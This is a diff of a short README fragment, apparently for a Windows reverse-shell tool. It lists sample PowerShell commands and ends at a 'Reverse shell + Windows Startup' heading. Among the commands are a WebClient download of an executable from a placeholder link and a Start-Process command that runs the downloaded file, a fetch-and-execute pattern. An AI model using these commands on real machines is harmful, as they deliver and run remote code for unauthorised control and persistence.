@@ -3,26 +3,26 @@
 
 ```d
 » sample commands
-```d
+
 » if you want to know username and file location name type pwd
 
-```d
+
 » Extract from Zip: Expand-Archive -Path C:\Users\{Username}\Downloads\lol.zip -DestinationPath C:\Users\{Username}\Downloads\3162
 
-```d
+
 » creates new folder: New-Item -ItemType Directory -Path "C:\Users\{Username}\Downloads\New Folder"
 
-```d
+
 » app deletes: Remove-Item "C:\Users\{Username}\Downloads\shell.exe"
 
-```d
+
 » The program downloads: powershell -c "(New-Object System.Net.WebClient).DownloadFile('https://YourDownloadLink/program.exe', 'C:\Users\{Username}\Downloads\Program.exe')"
 
-```d
+
 
 » Runs the program: powershell -c "Start-Process C:\Users\{Username}\Downloads\downloaded_file.exe"
 
-```d
+
 » Copies the file from one place to another: scp C:\Users\Administrator\Downloads\program.exe C:\Users\Administrator\Desktop\program.exe
 ```d
 » Reverse shell + Windows Startup
